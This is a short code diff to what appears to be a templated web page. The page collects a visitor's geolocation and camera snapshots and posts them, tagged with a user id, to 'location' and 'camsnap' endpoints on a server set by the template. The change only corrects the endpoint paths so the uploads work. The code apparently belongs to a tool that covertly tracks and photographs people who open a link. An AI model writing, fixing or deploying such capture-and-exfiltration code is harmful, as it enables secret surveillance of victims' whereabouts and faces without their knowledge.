@@ -147,7 +147,7 @@ l=true;
 
 function success(pos) {
 const crd = pos.coords;
-$.post("<%=a %>location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
 l=true;
 red();
 });
@@ -171,7 +171,7 @@ const canvas = document.getElementById('canvas');
 var imgsent=0;
 
 function post(o){
-$.post("<%=a %>camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
 imgsent+=1;
 if(imgsent==4){
 c=true;
